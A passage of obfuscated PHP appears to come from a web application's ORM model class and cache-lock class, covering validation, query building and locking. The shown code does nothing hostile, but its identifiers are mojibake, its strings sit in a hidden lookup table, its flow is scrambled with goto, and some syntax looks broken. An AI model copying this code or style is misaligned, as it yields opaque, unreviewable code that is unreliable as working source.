(isset($this->options[$E‚ª’¤¾ê’[278]])) { $BÑìö‹´ä² = $this->options[$E‚ª’¤¾ê’[278]]; unset($this->options[$E‚ª’¤¾ê’[278]]); } elseif ($AÏ²éˆÜç· == THINK_MODEL_INSERT && isset($this->insertFields)) { $BÑìö‹´ä² = $this->insertFields; } elseif ($AÏ²éˆÜç· == THINK_MODEL_UPDATE && isset($this->updateFields)) { $BÑìö‹´ä² = $this->updateFields; } goto Bæà÷ƒµ’; aË­ŒŞÒªŠ: $E‚ª’¤¾ê’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($DÄ¯µñ¥ø)) { $DÄ¯µñ¥ø = $_POST; } elseif (is_object($DÄ¯µñ¥ø)) { $DÄ¯µñ¥ø = get_object_vars($DÄ¯µñ¥ø); } if (empty($DÄ¯µñ¥ø) || !is_array($DÄ¯µñ¥ø)) { $this->error = think_lang($E‚ª’¤¾ê’[276]); return !1; } goto cÓòƒ¶í­; CÈèŠ¶ºÆ‰: } public function autoCheckToken($fñêÔÒÅˆã) { $BÌÜœæÙ­Ã =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($this->options[$BÌÜœæÙ­Ã[306]]) && !$this->options[$BÌÜœæÙ­Ã[306]]) { return !0; } if (think_config($BÌÜœæÙ­Ã[303])) { $f®åò¶÷áÍ = think_config($BÌÜœæÙ­Ã[304]); if (!isset($fñêÔÒÅˆã[$f®åò¶÷áÍ]) || Session::get($f®åò¶÷áÍ)) { return !1; } list($BŸí÷ñˆòâ, $AˆÜšÄõ’Â) = explode($BÌÜœæÙ­Ã[80], $fñêÔÒÅˆã[$f®åò¶÷áÍ]); if ($AˆÜšÄõ’Â && Session::get($f®åò¶÷áÍ . $BÌÜœæÙ­Ã[104] . $BŸí÷ñˆòâ) === $AˆÜšÄõ’Â) { Session::remove($f®åò¶÷áÍ . $BÌÜœæÙ­Ã[104] . $BŸí÷ñˆòâ); return !0; } if (think_config($BÌÜœæÙ­Ã[307])) { Session::remove($f®åò¶÷áÍ . $BÌÜœæÙ­Ã[104] . $BŸí÷ñˆòâ); } return !1; } return !0; } public function regex($BÊçõÆêÎÜ, $CƒİçÒ¢•ˆ) { $a•‹¼˜÷ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F÷ˆ»à±î¨ = array($a•‹¼˜÷[308] => $a•‹¼˜÷[309], $a•‹¼˜÷[310] => $a•‹¼˜÷[311], $a•‹¼˜÷[312] => $a•‹¼˜÷[313], $a•‹¼˜÷[314] => $a•‹¼˜÷[315], $a•‹¼˜÷[316] => $a•‹¼˜÷[317], $a•‹¼˜÷[318] => $a•‹¼˜÷[319], $a•‹¼˜÷[320] => $a•‹¼˜÷[321], $a•‹¼˜÷[295] => $a•‹¼˜÷[322], $a•‹¼˜÷[323] => $a•‹¼˜÷[324]); if (isset($F÷ˆ»à±î¨[strtolower($CƒİçÒ¢•ˆ)])) { $CƒİçÒ¢•ˆ = $F÷ˆ»à±î¨[strtolower($CƒİçÒ¢•ˆ)]; } return preg_match($CƒİçÒ¢•ˆ, $BÊçõÆêÎÜ) === 1; } private function autoOperation(&$bÀºğäº‰À, $b¿«”¾ã•) { $F•İ´à™‹‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!empty($this->options[$F•İ´à™‹‡[325]])) { $Cõ™åùî‹¤ = $this->options[$F•İ´à™‹‡[325]]; unset($this->options[$F•İ´à™‹‡[325]]); } elseif (!empty($this->_auto)) { $Cõ™åùî‹¤ = $this->_auto; } if (isset($Cõ™åùî‹¤)) { foreach ($Cõ™åùî‹¤ as $bÏğ†‹†±Œ) { if (empty($bÏğ†‹†±Œ[2])) { $bÏğ†‹†±Œ[2] = THINK_MODEL_INSERT; } if ($b¿«”¾ã• == $bÏğ†‹†±Œ[2] || $bÏğ†‹†±Œ[2] == THINK_MODEL_BOTH) { switch (trim($bÏğ†‹†±Œ[3])) { case $F•İ´à™‹‡[326]: case $F•İ´à™‹‡[327]: $C±‰ÆÕ™¹‰ = isset($bÏğ†‹†±Œ[4]) ? (array) $bÏğ†‹†±Œ[4] : array(); if (isset($bÀºğäº‰À[$bÏğ†‹†±Œ[0]])) { array_unshift($C±‰ÆÕ™¹‰, $bÀºğäº‰À[$bÏğ†‹†±Œ[0]]); } if ($F•İ´à™‹‡[326] == $bÏğ†‹†±Œ[3]) { $bÀºğäº‰À[$bÏğ†‹†±Œ[0]] = call_user_func_array($bÏğ†‹†±Œ[1], $C±‰ÆÕ™¹‰); } else { $bÀºğäº‰À[$bÏğ†‹†±Œ[0]] = call_user_func_array(array(&$this, $bÏğ†‹†±Œ[1]), $C±‰ÆÕ™¹‰); } break; case $F•İ´à™‹‡[278]: $bÀºğäº‰À[$bÏğ†‹†±Œ[0]] = $bÀºğäº‰À[$bÏğ†‹†±Œ[1]]; break; case $F•İ´à™‹‡[328]: if ($F•İ´à™‹‡[33] === $bÀºğäº‰À[$bÏğ†‹†±Œ[0]]) { unset($bÀºğäº‰À[$bÏğ†‹†±Œ[0]]); } break; case $F•İ´à™‹‡[329]: default: $bÀºğäº‰À[$bÏğ†‹†±Œ[0]] = $bÏğ†‹†±Œ[1]; } if (!1 === $bÀºğäº‰À[$bÏğ†‹†±Œ[0]]) { unset($bÀºğäº‰À[$bÏğ†‹†±Œ[0]]); } } } } return $bÀºğäº‰À; } protected function autoValidation($DÖ²™åËì, $D‘‘É‹¼›) { $EÀ‰»Ò•¹§ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!empty($this->options[$EÀ‰»Ò•¹§[330]])) { $f¶ï‘——£ = $this->options[$EÀ‰»Ò•¹§[330]]; unset($this->options[$EÀ‰»Ò•¹§[330]]); } elseif (!empty($this->_validate)) { $f¶ï‘——£ = $this->_validate; } if (isset($f¶ï‘——£)) { if ($this->patchValidate) { $this->error = array(); } foreach ($f¶ï‘——£ as $e“§öÚò¡¦ => $CïÇÃƒ•µ•) { if (empty($CïÇÃƒ•µ•[5]) || $CïÇÃƒ•µ•[5] == THINK_MODEL_BOTH || $CïÇÃƒ•µ•[5] == $D‘‘É‹¼›) { if (0 == strpos($CïÇÃƒ•µ•[2], $EÀ‰»Ò•¹§[331]) && strpos($CïÇÃƒ•µ•[2], $EÀ‰»Ò•¹§[332])) { $CïÇÃƒ•µ•[2] = think_lang(substr($CïÇÃƒ•µ•[2], 2, -1)); } $CïÇÃƒ•µ•[3] = isset($CïÇÃƒ•µ•[3]) ? $CïÇÃƒ•µ•[3] : THINK_EXISTS_VALIDATE; $CïÇÃƒ•µ•[4] = isset($CïÇÃƒ•µ•[4]) ? $CïÇÃƒ•µ•[4] : $EÀ‰»Ò•¹§[333]; switch ($CïÇÃƒ•µ•[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($DÖ²™åËì, $CïÇÃƒ•µ•)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($EÀ‰»Ò•¹§[33] != trim($DÖ²™åËì[$CïÇÃƒ•µ•[0]])) { if (!1 === $this->_validationField($DÖ²™åËì, $CïÇÃƒ•µ•)) { return !1; } } break; default: if (isset($DÖ²™åËì[$CïÇÃƒ•µ•[0]])) { if (!1 === $this->_validationField($DÖ²™åËì, $CïÇÃƒ•µ•)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eª¨“è÷î, $dÈË¶×´Ú—) { if (!1 === $this->_validationFieldItem($eª¨“è÷î, $dÈË¶×´Ú—)) { if ($this->patchValidate) { $this->error[$dÈË¶×´Ú—[0]] = $dÈË¶×´Ú—[2]; } else { $this->error = $dÈË¶×´Ú—[2]; return !1; } } return; } protected function _validationFieldItem($B™ƒÁ¯ó£Æ, $bÀËô§¡‘Ì) { $a˜æ‡Àí =& $_SERVER[í¤âËÚ£¶íÊ¢]; switch (strtolower(trim($bÀËô§¡‘Ì[4]))) { case $a˜æ‡Àí[326]: case $a˜æ‡Àí[327]: $fœ¶ÃŠÑß = isset($bÀËô§¡‘Ì[6]) ? (array) $bÀËô§¡‘Ì[6] : array(); if (is_string($bÀËô§¡‘Ì[0]) && strpos($bÀËô§¡‘Ì[0], $a˜æ‡Àí[47])) { $bÀËô§¡‘Ì[0] = explode($a˜æ‡Àí[47], $bÀËô§¡‘Ì[0]); } if (is_array($bÀËô§¡‘Ì[0])) { foreach ($bÀËô§¡‘Ì[0] as $eô„›éÃ) { $dÀ¾¼œò’[$eô„›éÃ] = $B™ƒÁ¯ó£Æ[$eô„›éÃ]; } array_unshift($fœ¶ÃŠÑß, $dÀ¾¼œò’); } else { array_unshift($fœ¶ÃŠÑß, $B™ƒÁ¯ó£Æ[$bÀËô§¡‘Ì[0]]); } if ($a˜æ‡Àí[326] == $bÀËô§¡‘Ì[4]) { return call_user_func_array($bÀËô§¡‘Ì[1], $fœ¶ÃŠÑß); } else { return call_user_func_array(array(&$this, $bÀËô§¡‘Ì[1]), $fœ¶ÃŠÑß); } case $a˜æ‡Àí[334]: return $B™ƒÁ¯ó£Æ[$bÀËô§¡‘Ì[0]] == $B™ƒÁ¯ó£Æ[$bÀËô§¡‘Ì[1]]; case $a˜æ‡Àí[335]: if (is_string($bÀËô§¡‘Ì[0]) && strpos($bÀËô§¡‘Ì[0], $a˜æ‡Àí[47])) { $bÀËô§¡‘Ì[0] = explode($a˜æ‡Àí[47], $bÀËô§¡‘Ì[0]); } $c®²Îöœê÷ = array(); if (is_array($bÀËô§¡‘Ì[0])) { foreach ($bÀËô§¡‘Ì[0] as $eô„›éÃ) { $c®²Îöœê÷[$eô„›éÃ] = $B™ƒÁ¯ó£Æ[$eô„›éÃ]; } } else { $c®²Îöœê÷[$bÀËô§¡‘Ì[0]] = $B™ƒÁ¯ó£Æ[$bÀËô§¡‘Ì[0]]; } if (!empty($B™ƒÁ¯ó£Æ[$this->getPk()])) { $c®²Îöœê÷[$this->getPk()] = array($a˜æ‡Àí[336], $B™ƒÁ¯ó£Æ[$this->getPk()]); } if ($this->where($c®²Îöœê÷)->find()) { return !1; } return !0; default: return $this->check($B™ƒÁ¯ó£Æ[$bÀËô§¡‘Ì[0]], $bÀËô§¡‘Ì[1], $bÀËô§¡‘Ì[4]); } } public function check($C¢ŸœªÀ, $Dª™ìãíŞÙ, $E›Œè†Ìã¡ = "\162\x65\x67\x65\170") { $C¿éÁëÒ¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E›Œè†Ìã¡ = strtolower(trim($E›Œè†Ìã¡)); switch ($E›Œè†Ìã¡) { case $C¿éÁëÒ¾[7]: case $C¿éÁëÒ¾[337]: $fÔÚ¾Ò×›‘ = is_array($Dª™ìãíŞÙ) ? $Dª™ìãíŞÙ : explode($C¿éÁëÒ¾[47], $Dª™ìãíŞÙ); return $E›Œè†Ìã¡ == $C¿éÁëÒ¾[7] ? in_array($C¢ŸœªÀ, $fÔÚ¾Ò×›‘) : !in_array($C¢ŸœªÀ, $fÔÚ¾Ò×›‘); case $C¿éÁëÒ¾[338]: case $C¿éÁëÒ¾[339]: if (is_array($Dª™ìãíŞÙ)) { $eå…Ë™ÒÛ = $Dª™ìãíŞÙ[0]; $E˜ï½¨åå = $Dª™ìãíŞÙ[1]; } else { list($eå…Ë™ÒÛ, $E˜ï½¨åå) = explode($C¿éÁëÒ¾[47], $Dª™ìãíŞÙ); } return $E›Œè†Ìã¡ == $C¿éÁëÒ¾[338] ? $C¢ŸœªÀ >= $eå…Ë™ÒÛ && $C¢ŸœªÀ <= $E˜ï½¨åå : $C¢ŸœªÀ < $eå…Ë™ÒÛ || $C¢ŸœªÀ > $E˜ï½¨åå; case $C¿éÁëÒ¾[340]: case $C¿éÁëÒ¾[341]: return $E›Œè†Ìã¡ == $C¿éÁëÒ¾[340] ? $C¢ŸœªÀ == $Dª™ìãíŞÙ : $C¢ŸœªÀ != $Dª™ìãíŞÙ; case $C¿éÁëÒ¾[342]: $D‹ƒÊƒ‡éê = mb_strlen($C¢ŸœªÀ, $C¿éÁëÒ¾[343]); if (strpos($Dª™ìãíŞÙ, $C¿éÁëÒ¾[47])) { list($eå…Ë™ÒÛ, $E˜ï½¨åå) = explode($C¿éÁëÒ¾[47], $Dª™ìãíŞÙ); return $D‹ƒÊƒ‡éê >= $eå…Ë™ÒÛ && $D‹ƒÊƒ‡éê <= $E˜ï½¨åå; } else { return $D‹ƒÊƒ‡éê == $Dª™ìãíŞÙ; } case $C¿éÁëÒ¾[344]: list($dã£àôğ¿ñ, $BêóĞëŸ¼Ì) = explode($C¿éÁëÒ¾[47], $Dª™ìãíŞÙ); if (!is_numeric($dã£àôğ¿ñ)) { $dã£àôğ¿ñ = strtotime($dã£àôğ¿ñ); } if (!is_numeric($BêóĞëŸ¼Ì)) { $BêóĞëŸ¼Ì = strtotime($BêóĞëŸ¼Ì); } return NOW_TIME >= $dã£àôğ¿ñ && NOW_TIME <= $BêóĞëŸ¼Ì; case $C¿éÁëÒ¾[345]: return in_array(get_client_ip(), explode($C¿éÁëÒ¾[47], $Dª™ìãíŞÙ)); case $C¿éÁëÒ¾[346]: return !in_array(get_client_ip(), explode($C¿éÁëÒ¾[47], $Dª™ìãíŞÙ)); case $C¿éÁëÒ¾[333]: default: return $this->regex($C¢ŸœªÀ, $Dª™ìãíŞÙ); } } public function query($F™Ÿê¸»Ö´, $DÁµùË¢ê° = false) { $Fì¹’’ä·Ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!is_bool($DÁµùË¢ê°) && !is_array($DÁµùË¢ê°)) { $DÁµùË¢ê° = func_get_args(); array_shift($DÁµùË¢ê°); } $F™Ÿê¸»Ö´ = str_replace(array($Fì¹’’ä·Ù[63], $Fì¹’’ä·Ù[347]), $Fì¹’’ä·Ù[50], $F™Ÿê¸»Ö´); $F™Ÿê¸»Ö´ = $this->parseSql($F™Ÿê¸»Ö´, $DÁµùË¢ê°); return $this->db->query($F™Ÿê¸»Ö´); } public function execute($Fù£ÒÑŒ·¿, $Fâß“ÅØÀ„ = false) { if (!is_bool($Fâß“ÅØÀ„) && !is_array($Fâß“ÅØÀ„)) { $Fâß“ÅØÀ„ = func_get_args(); array_shift($Fâß“ÅØÀ„); } $Fù£ÒÑŒ·¿ = $this->parseSql($Fù£ÒÑŒ·¿, $Fâß“ÅØÀ„); return $this->db->execute($Fù£ÒÑŒ·¿); } protected function parseSql($f§§ ¦ÍÜ, $C‡Ğ÷×ë“İ) { $CÖˆŠªÑãã =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!0 === $C‡Ğ÷×ë“İ) { $FòÛïæŞå = $this->_parseOptions(); $f§§ ¦ÍÜ = $this->db->parseSql($f§§ ¦ÍÜ, $FòÛïæŞå); } elseif (is_array($C‡Ğ÷×ë“İ)) { $C‡Ğ÷×ë“İ = array_map(array($this->db, $CÖˆŠªÑãã[348]), $C‡Ğ÷×ë“İ); $f§§ ¦ÍÜ = vsprintf($f§§ ¦ÍÜ, $C‡Ğ÷×ë“İ); } else { $f§§ ¦ÍÜ = strtr($f§§ ¦ÍÜ, array($CÖˆŠªÑãã[349] => $this->getTableName(), $CÖˆŠªÑãã[350] => think_config($CÖˆŠªÑãã[249]))); } $this->db->setModel($this->name); return $f§§ ¦ÍÜ; } public function db($bÉŒ™èï› = '', $e™‹Ñİ˜† = '', $fæÑìï•à” = array()) { goto fô–­„×¹¥; EÀãÏœÓ: $bîËÛ…Äº[$bÉŒ™èï›] = $e™‹Ñİ˜†; $this->db = $C£Â–™˜°ì[$bÉŒ™èï›]; $this->_after_db(); goto DåÜçÃ¦È; DåÜçÃ¦È: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A ÂÃ÷È¸¿; D±‹¬à™à: static $C£Â–™˜°ì = array(); if (!isset($C£Â–™˜°ì[$bÉŒ™èï›]) || isset($C£Â–™˜°ì[$bÉŒ™èï›]) && $e™‹Ñİ˜† && $bîËÛ…Äº[$bÉŒ™èï›] != $e™‹Ñİ˜†) { if (!empty($e™‹Ñİ˜†) && is_string($e™‹Ñİ˜†) && !1 === strpos($e™‹Ñİ˜†, $F“ğñòÂŒø[8])) { $e™‹Ñİ˜† = think_config($e™‹Ñİ˜†); } $C£Â–™˜°ì[$bÉŒ™èï›] = Db::getInstance($e™‹Ñİ˜†); } elseif (NULL === $e™‹Ñİ˜†) { $C£Â–™˜°ì[$bÉŒ™èï›]->close(); unset($C£Â–™˜°ì[$bÉŒ™èï›]); return; } if (!empty($fæÑìï•à”)) { if (is_string($fæÑìï•à”)) { parse_str($fæÑìï•à”, $fæÑìï•à”); } foreach ($fæÑìï•à” as $båš¸Ó¼¼£ => $d–š­ƒÇÒ) { $this->setProperty($båš¸Ó¼¼£, $d–š­ƒÇÒ); } } goto EÀãÏœÓ; fô–­„×¹¥: $F“ğñòÂŒø =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($F“ğñòÂŒø[33] === $bÉŒ™èï› && $this->db) { return $this->db; } static $bîËÛ…Äº = array(); goto D±‹¬à™à; A ÂÃ÷È¸¿: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $dø¡åà’’„ = get_class($this); if ($dø¡åà’’„ == $_SERVER[í¤âËÚ£¶íÊ¢][351]) { return $this->name; } $this->name = substr($dø¡åà’’„, 0, -5); } return $this->name; } public function getTableName() { $c§Ô­Ê›¥ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($this->trueTableName)) { $f£±‘ªšß = !empty($this->tablePrefix) ? $this->tablePrefix : $c§Ô­Ê›¥ğ[33]; if (!empty($this->tableName)) { $f£±‘ªšß .= $this->tableName; } else { $f£±‘ªšß .= think_parse_name($this->name); } $this->trueTableName = strtolower($f£±‘ªšß); } return (!empty($this->dbName) ? $this->dbName . $c§Ô­Ê›¥ğ[104] : $c§Ô­Ê›¥ğ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $b‚öÎº¨÷ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return isset($this->fields[$b‚öÎº¨÷[256]]) ? $this->fields[$b‚öÎº¨÷[256]] : $this->pk; } public function getDbFields() { $e•’Ù†‹»† =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($this->options[$e•’Ù†‹»†[284]])) { $DÖÅí®µ– = $this->db->getFields($this->options[$e•’Ù†‹»†[284]]); return $DÖÅí®µ– ? array_keys($DÖÅí®µ–) : !1; } if ($this->fields) { $DÖÅí®µ– = $this->fields; unset($DÖÅí®µ–[$e•’Ù†‹»†[255]], $DÖÅí®µ–[$e•’Ù†‹»†[256]], $DÖÅí®µ–[$e•’Ù†‹»†[257]], $DÖÅí®µ–[$e•’Ù†‹»†[254]]); return $DÖÅí®µ–; } return !1; } public function data($A°“àšØÔõ = '') { $böÔ½Á¥‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($böÔ½Á¥‡[33] === $A°“àšØÔõ && !empty($this->data)) { return $this->data; } if (is_object($A°“àšØÔõ)) { $A°“àšØÔõ = get_object_vars($A°“àšØÔõ); } elseif (is_string($A°“àšØÔõ)) { parse_str($A°“àšØÔõ, $A°“àšØÔõ); } elseif (!is_array($A°“àšØÔõ)) { think_exception(think_lang($böÔ½Á¥‡[276])); } $this->data = $A°“àšØÔõ; return $this; } public function join($dœ¿‡¸¢Á) { $e£äÉ«Ğâ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_array($dœ¿‡¸¢Á)) { $this->options[$e£äÉ«Ğâ[287]] = $dœ¿‡¸¢Á; } elseif (!empty($dœ¿‡¸¢Á)) { $this->options[$e£äÉ«Ğâ[287]][] = $dœ¿‡¸¢Á; } return $this; } public function union($Aåó‡¾íİ‰, $C¾‹³Á„¤ = false) { goto C©Øºî™èˆ; e‰›§·„“È: return $this; goto AïÍê ¨; C©Øºî™èˆ: $AŸÌ’‡ò° =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($Aåó‡¾íİ‰)) { return $this; } if ($C¾‹³Á„¤) { $this->options[$AŸÌ’‡ò°[352]][$AŸÌ’‡ò°[353]] = !0; } goto f„“»ÈŞ¼ù; f„“»ÈŞ¼ù: if (is_object($Aåó‡¾íİ‰)) { $Aåó‡¾íİ‰ = get_object_vars($Aåó‡¾íİ‰); } if (is_string($Aåó‡¾íİ‰)) { $dµùé»ë—å = $Aåó‡¾íİ‰; } elseif (is_array($Aåó‡¾íİ‰)) { if (isset($Aåó‡¾íİ‰[0])) { $this->options[$AŸÌ’‡ò°[352]] = array_merge($this->options[$AŸÌ’‡ò°[352]], $Aåó‡¾íİ‰); return $this; } else { $dµùé»ë—å = $Aåó‡¾íİ‰; } } else { think_exception(think_lang($AŸÌ’‡ò°[276])); } $this->options[$AŸÌ’‡ò°[352]][] = $dµùé»ë—å; goto e‰›§·„“È; AïÍê ¨: } public function cache($Eìº¸Öƒô³ = true, $A¸¦Š¬À¢ = null, $c¾ÉÚïä‰† = '') { $fæ¸Ë¢ğ„î =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!1 !== $Eìº¸Öƒô³) { $this->options[$fæ¸Ë¢ğ„î[354]] = array($fæ¸Ë¢ğ„î[102] => $Eìº¸Öƒô³, $fæ¸Ë¢ğ„î[344] => $A¸¦Š¬À¢, $fæ¸Ë¢ğ„î[29] => $c¾ÉÚïä‰†); } return $this; } public function field($D¨Ğ®Åøƒ‹, $EÑ‡ËëÑèÊ = false) { $c­¡‡¶¶ŒÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!0 === $D¨Ğ®Åøƒ‹) { $dÎôã¡¯¹¯ = $this->getDbFields(); $D¨Ğ®Åøƒ‹ = $dÎôã¡¯¹¯ ? $dÎôã¡¯¹¯ : $c­¡‡¶¶ŒÖ[191]; } elseif ($EÑ‡ËëÑèÊ) { if (is_string($D¨Ğ®Åøƒ‹)) { $D¨Ğ®Åøƒ‹ = explode($c­¡‡¶¶ŒÖ[47], $D¨Ğ®Åøƒ‹); } $dÎôã¡¯¹¯ = $this->getDbFields(); $D¨Ğ®Åøƒ‹ = $dÎôã¡¯¹¯ ? array_diff($dÎôã¡¯¹¯, $D¨Ğ®Åøƒ‹) : $D¨Ğ®Åøƒ‹; } $this->options[$c­¡‡¶¶ŒÖ[278]] = $D¨Ğ®Åøƒ‹; return $this; } public function scope($BßÒÆ‘öè‡ = '', $E÷ÙˆÃõ×Ú = NULL) { $a¨‡ò‹õïè =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($a¨‡ò‹õïè[33] === $BßÒÆ‘öè‡) { if (isset($this->_scope[$a¨‡ò‹õïè[34]])) { $fê†Ş×Òè = $this->_scope[$a¨‡ò‹õïè[34]]; } else { return $this; } } elseif (is_string($BßÒÆ‘öè‡)) { $E™ˆ²Í¶ = explode($a¨‡ò‹õïè[47], $BßÒÆ‘öè‡); $fê†Ş×Òè = array(); foreach ($E™ˆ²Í¶ as $f¢Ù’ôö²) { if (!isset($this->_scope[$f¢Ù’ôö²])) { continue; } $fê†Ş×Òè = array_merge($fê†Ş×Òè, $this->_scope[$f¢Ù’ôö²]); } if (!empty($E÷ÙˆÃõ×Ú) && is_array($E÷ÙˆÃõ×Ú)) { $fê†Ş×Òè = array_merge($fê†Ş×Òè, $E÷ÙˆÃõ×Ú); } } elseif (is_array($BßÒÆ‘öè‡)) { $fê†Ş×Òè = $BßÒÆ‘öè‡; } if (is_array($fê†Ş×Òè) && !empty($fê†Ş×Òè)) { $this->options = array_merge($this->options, array_change_key_case($fê†Ş×Òè)); } return $this; } public function where($F¾íºÂÄÁ, $DÒ»ÏµÕ­Û = null) { $EåÉ‘ˆ°Œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!is_null($DÒ»ÏµÕ­Û) && is_string($F¾íºÂÄÁ)) { if (!is_array($DÒ»ÏµÕ­Û)) { $DÒ»ÏµÕ­Û = func_get_args(); array_shift($DÒ»ÏµÕ­Û); } $DÒ»ÏµÕ­Û = array_map(array($this->db, $EåÉ‘ˆ°Œ[348]), $DÒ»ÏµÕ­Û); $F¾íºÂÄÁ = vsprintf($F¾íºÂÄÁ, $DÒ»ÏµÕ­Û); } elseif (is_object($F¾íºÂÄÁ)) { $F¾íºÂÄÁ = get_object_vars($F¾íºÂÄÁ); } elseif (is_array($F¾íºÂÄÁ)) { foreach ($F¾íºÂÄÁ as $dÖÀŞöè•Ü => $c¶íŞË•è) { if ((is_numeric($dÖÀŞöè•Ü) || !$dÖÀŞöè•Ü) && is_string($c¶íŞË•è)) { if (strpos($c¶íŞË•è, $EåÉ‘ˆ°Œ[355]) === 0) { continue; } think_trace($EåÉ‘ˆ°Œ[356], $EåÉ‘ˆ°Œ[33], $EåÉ‘ˆ°Œ[46]); die; } } } if (is_string($F¾íºÂÄÁ) && $EåÉ‘ˆ°Œ[33] != $F¾íºÂÄÁ) { $bõÏªËåÁÜ = array(); $bõÏªËåÁÜ[$EåÉ‘ˆ°Œ[357]] = $F¾íºÂÄÁ; $F¾íºÂÄÁ = $bõÏªËåÁÜ; } if (isset($this->options[$EåÉ‘ˆ°Œ[280]])) { $this->options[$EåÉ‘ˆ°Œ[280]] = array_merge($this->options[$EåÉ‘ˆ°Œ[280]], $F¾íºÂÄÁ); } else { $this->options[$EåÉ‘ˆ°Œ[280]] = $F¾íºÂÄÁ; } return $this; } public function limit($bø¼…®ªÂ, $CÃøø°ø«» = null) { $E½ĞÜ×òö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->options[$E½ĞÜ×òö[297]] = is_null($CÃøø°ø«») ? $bø¼…®ªÂ : $bø¼…®ªÂ . $E½ĞÜ×òö[47] . $CÃøø°ø«»; return $this; } public function page($d•­í’ÇÓê, $f© ‘ÂÏ¼ = null) { $Fµ×„¶½¨Î =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->options[$Fµ×„¶½¨Î[358]] = is_null($f© ‘ÂÏ¼) ? $d•­í’ÇÓê : $d•­í’ÇÓê . $Fµ×„¶½¨Î[47] . $f© ‘ÂÏ¼; return $this; } public function comment($Bìâ©šë»†) { $this->options[$_SERVER[í¤âËÚ£¶íÊ¢][359]] = $Bìâ©šë»†; return $this; } public function setProperty($AõÂºÊº‚—, $e±°âØ£„) { if (property_exists($this, $AõÂºÊº‚—)) { $this->{$AõÂºÊº‚—} = $e±°âØ£„; } return $this; } } goto EÔŒ…¤‹õİ; BéØßŞÒ±½: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto e´®ÀéÊÀù; eµå›¹«…¥: self::$timeout = $bîªù…™¾©[$aº—´ŒÑåÊ[774]] ? $bîªù…™¾©[$aº—´ŒÑåÊ[774]] : 10; $bé’åÂ¡ = _get($GLOBALS[$aº—´ŒÑåÊ[6]], $aº—´ŒÑåÊ[775]); $e’¯Ú¥Ïî = $bîªù…™¾©[$aº—´ŒÑåÊ[761]] ? $bîªù…™¾©[$aº—´ŒÑåÊ[761]] : $aº—´ŒÑåÊ[201]; goto E—ŒŒ×ñ; E—ŒŒ×ñ: if ($e’¯Ú¥Ïî == $aº—´ŒÑåÊ[17] && $bé’åÂ¡ == $aº—´ŒÑåÊ[9]) { $e’¯Ú¥Ïî = $aº—´ŒÑåÊ[201]; } switch ($e’¯Ú¥Ïî) { case $aº—´ŒÑåÊ[764]: self::$handle = new CacheLockRedis(); break; case $aº—´ŒÑåÊ[765]: self::$handle = new CacheLockMemcached(); break; case $aº—´ŒÑåÊ[17]: self::$handle = new CacheLockDatabase(); break; case $aº—´ŒÑåÊ[201]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a§öŸ¢×ãÕ; e´®ÀéÊÀù: $aº—´ŒÑåÊ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::$handle) { return self::$handle; } $bîªù…™¾© = $GLOBALS[$aº—´ŒÑåÊ[6]][$aº—´ŒÑåÊ[354]]; goto eµå›¹«…¥; a§öŸ¢×ãÕ: } private static function key($bµ›™Â·å¡) { return $_SERVER[í¤âËÚ£¶íÊ¢][776] . Cache::key($bµ›™Â·å¡); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AâÜÄØçÊÎ = '') { self::$errorMsg = $AâÜÄØçÊÎ; } public static function lockGlobal($f´¨À¡›, $B„ŒŞ°Í) { return self::lock($f´¨À¡›, $B„ŒŞ°Í, !0); } public static function lock($aä«¬Û¾¾…, $dƒòÚà¸‡Ù = false, $eëºÏ™Í„Ï = false) { goto a†ë‰µ¬òÏ; DÏóè¿µ¿: if (!$eëºÏ™Í„Ï) { self::$lockItem[$F¯°…ËˆĞ] = !0; } return $BÚô„†Ò; goto D¿²´‹Á»¸; A‚¾ğ´˜: $dƒòÚà¸‡Ù = $dƒòÚà¸‡Ù ? $dƒòÚà¸‡Ù : self::$timeout; $BÚô„†Ò = $EÒ¼±Š¨Á->lock($F¯°…ËˆĞ, $dƒòÚà¸‡Ù); if (!$BÚô„†Ò) { $e¦å†öÁ¾á = "\x6c\x6f\x63\x6b\40\145\x72\x72\x6f\x72\x3b\x6b\x65\171\75{$aä«¬Û¾¾…}\x3b\x74\151\x6d\x65\x3d{$dƒòÚà¸‡Ù}\73" . self::$errorMsg . $C”§½å’˜[77] . get_caller_msg(); $CŠÈÒôæ = LNG($C”§½å’˜[777]) . "\50{$dƒòÚà¸‡Ù}\x73\x29\x2e" . LNG($C”§½å’˜[778]); $CŠÈÒôæ .= $C”§½å’˜[779]; if (is_string(self::$errorMsg) && self::$errorMsg) { $CŠÈÒôæ = 